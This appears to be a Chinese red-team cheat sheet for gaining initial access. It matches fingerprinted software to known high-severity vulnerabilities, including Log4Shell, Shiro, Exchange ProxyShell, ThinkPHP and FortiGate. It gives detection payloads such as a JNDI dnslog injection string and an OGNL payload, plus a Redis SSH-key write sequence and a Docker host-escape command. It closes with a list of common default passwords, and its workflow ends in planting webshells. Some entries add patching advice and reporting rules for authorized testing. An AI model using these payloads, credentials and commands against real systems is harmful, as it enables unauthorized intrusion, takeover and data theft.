# 高危漏洞速查（打点向）

> 用法：指纹识别组件与版本 → 本表匹配 → 按「识别特征」确认 → 「利用要点」执行 → 落地（03-02）。
> 收录标准：公网常见、武器化成熟、危害 RCE/未授权级。按组件字母排序，新漏洞由每周情报（12）滚动补充。

## Java 生态

| 组件 | 漏洞 | 影响版本 | 识别特征 | 利用要点 |
| --- | --- | --- | --- | --- |
| Apache Log4j2 | CVE-2021-44228 (Log4Shell) | 2.0~2.14.1 | 任意输入点插 `${jndi:ldap://dnslog/x}`（UA、登录框、搜索框、表单全插） | JNDI 注入→RCE；不出网时打本地链/回显；JDK 高版本需绕 trustURLCodebase |
| Apache Shiro | Shiro-550 (CVE-2016-4437) | <1.2.4 | Set-Cookie: rememberMe=deleteMe | 硬编码 key AES 解密 rememberMe→反序列化 RCE；工具：ShiroExploit/夏蛰 |
| Apache Shiro | Shiro-721 | <1.4.2 | 有有效 rememberMe cookie | Padding Oracle，需先有合法 cookie |
| Fastjson | 反序列化 RCE 系列 | ≤1.2.24/47/68/80 等 | JSON 接口，测 `{"@type":"java.net.Inet4Address","val":"x.dnslog"}` | 按版本选 payload，1.2.83 后默认 safeMode |
| Jackson | CVE-2020-8840 等 | 老版本 enableDefaultTyping | JSON 接口 | 类似 fastjson 打 JNDI |
| Weblogic | CVE-2019-2725 (wls-wsat) | 10.3.6/12.1.3 | `/_async/AsyncResponseService` 可访问 | XMLDecoder 反序列化 RCE |
| Weblogic | CVE-2020-14882/14883 | 10.3.6~14.1.1 | console 未授权 | 未授权+代码执行组合拳 |
| JBoss | CVE-2017-12149 | 5.x/6.x | `/invoker/readonly` | 反序列化 |
| Confluence | CVE-2022-26134 | <7.18.1 | OGNL 注入 | `${(#a=@org.apache.commons.io.IOUtils@toString(...))}` 回显/RCE |
| Confluence | CVE-2023-22515 | 8.0.0~8.5.1 | 未授权建管理员 | 建 admin 账号→装恶意插件 |
| Jenkins | 脚本控制台/未授权 | 配置错误 | `/script` 可访问 | Groovy 直接 RCE |
| GitLab | CVE-2021-22205 | 11.9~13.10.3 | 公开版 GitLab | ExifTool 命令注入 RCE |
| Apache Tomcat（集群） | CVE-2026-34486 EncryptInterceptor fail-open | 启用集群加密拦截器的受影响版本（以官方修复分支为准） | `server.xml` 含 EncryptInterceptor；Tribes receiver 端口可达 | 解密失败仍转发 → 反序列化面；优先隔离集群口并升级；详模式见审计 Java 分册时效条目 |
| SharePoint Server | CVE-2026-50522 等 RCE（含 machine key 残留风险） | 在野利用组件版本以 MSRC 为准 | 指纹 SharePoint；关注 ViewState/机器密钥相关告警 | 先打补丁；补丁后轮换 machine key，防「修洞后仍持钥匙」；08-12 双 CVE 链待核验后补行 |

## 微软/Exchange

> Exchange 完整打法（指纹、三代 Proxy 漏洞链、凭据打法、落地与域权限扩大）见 `03_初始访问/03-Exchange专项.md`。

| 组件 | 漏洞 | 影响 | 要点 |
| --- | --- | --- | --- |
| Exchange | ProxyLogon CVE-2021-26855 | 2013/2016/2019 | SSRF+认证绕过→写 webshell；探测 `/owa/auth/x.js` |
| Exchange | ProxyShell CVE-2021-34473 | 2013/2016/2019 | 路径混淆→autodiscover SSRF→导邮箱/写马 |
| Exchange | ProxyNotShell CVE-2022-41040/41082 | 2013-2019 | SSRF+PowerShell 反序列化 RCE |
| Exchange | CVE-2026-45504（WOPI/WAC SSRF→文件读） | 2016 CU23/2019 CU14/CU15/SE RTM（2026-06 SU 前） | 低权凭据→EWS ReferenceAttachment→恶意 WOPI 端点返回 file:///…# →任意文件读取，读配置/凭据后升级 RCE；详链见 03-Exchange专项 5.10 |

## PHP/CMS/国内应用

| 组件 | 漏洞 | 识别 | 要点 |
| --- | --- | --- | --- |
| ThinkPHP | 5.x RCE 系列（5.0.23/5.1.31） | `?s=index/\think\app/invokefunction` 特征路径 | 函数调用链直接 RCE |
| Drupal | Drupalgeddon2 CVE-2018-7600 | 7.x/8.x | render 数组 RCE |
| 泛微 E-Office | 多个文件上传/SQLi | `/general/login` | 历史 Nday 极多，逐个测 |
| 泛微 Ecology | CVE-2023-2648 等 | `/weaver/` 特征 | 文件上传/注入 |
| 致远 OA | 多个未授权/上传 | `/seeyon/` 特征 | 历史 Nday 密集 |
| 用友 NC | 反序列化/文件读取 | `/uapjs/` 特征 | bsh.servlet 直接执行 |
| 帆软报表 | 未授权命令执行 | `/webroot/decision` | 低版本直接 RCE |
| WordPress | 核心与插件 Nday 群 | `/wp-content/` 指纹 | 插件漏洞是主战场，wpscan 枚举 |
| CodeIgniter4 | CVE-2026-63223 上传校验绕过 | <4.7.4；`is_image`/`mime_in` 且保留客户端文件名、目录可执行 | 指纹 CI4；测上传是否只验内容不验扩展 | 魔数伪装 + `.php` 名；升 4.7.4+ 或强制扩展白名单+随机文件名 |

## 边界设备/安全产品

| 产品 | 方向 | 要点 |
| --- | --- | --- |
| 深信服 SSL VPN | 历史任意文件读取/RCE | 关注版本指纹，Nday 已老但存量未修 |
| FortiGate | CVE-2024-21762 / CVE-2023-27997 | SSLVPN 预认证 RCE |
| Pulse Secure | CVE-2019-11510 | 任意文件读取拿凭据 |
| F5 BIG-IP | CVE-2020-5902 | TMUI RCE |
| VMware vCenter | CVE-2021-21972/21985 | 文件上传/反序列化 RCE |
| Zabbix | CVE-2022-23131 | SAML 认证绕过→控制台 RCE |

## AI / 低代码与 Agent 平台

| 组件 | 漏洞 | 识别 | 要点 |
| --- | --- | --- | --- |
| IBM Langflow OSS | CVE-2026-9198 未授权 RCE | 开放 `/api/v1/`；版本 ≤1.10.0 | `auto_login` 签发超级用户令牌 → `validate/code` 执行代码；升 1.10.1；已 KEV |
| Azure SRE Agent | CVE-2026-62830 OBO 越权（待结合租户审计） | Azure 托管 AI 运维代理 | 无客户侧补丁；审托管身份与 RBAC；属云控制面风险 |

## 通用服务

| 服务 | 方向 | 命令/要点 |
| --- | --- | --- |
| Redis 未授权 | 写 ssh key/计划任务/主从 RCE | `redis-cli -h x` → config set dir /root/.ssh → set x key → save；4.x/5.x 主从复制加载 so 直接 RCE |
| Docker 2375 | 未授权 API | `docker -H tcp://x:2375 run -v /:/host alpine chroot /host` |
| Hadoop YARN | 未授权 | REST API 提交应用 RCE |
| Elasticsearch | CVE-2014/2015 老洞 + 未授权数据泄露 | `_search` 拖数据 |
| MQTT/kafka/zk 未授权 | 内网信息富矿 | 订阅 topic 收集情报 |

## 默认口令速记（高频命中）

`admin/admin`、`admin/123456`、`admin/admin123`、`tomcat/tomcat`、`sangfor/sangfor`、 zabbix `Admin/zabbix`、grafana `admin/admin`（首次强制改但未改）、Harbor `admin/Harbor12345`、nacos `nacos/nacos`。

## 使用纪律
1. 先 DNSLog 级验证（无回显、不破坏），再考虑写马。
2. 每个命中记录：目标、指纹证据、漏洞、利用截图、影响（报告六要素）。
3. 新 1Day 由每周情报补充进本表；旧洞确认已无存量时移入档案区。
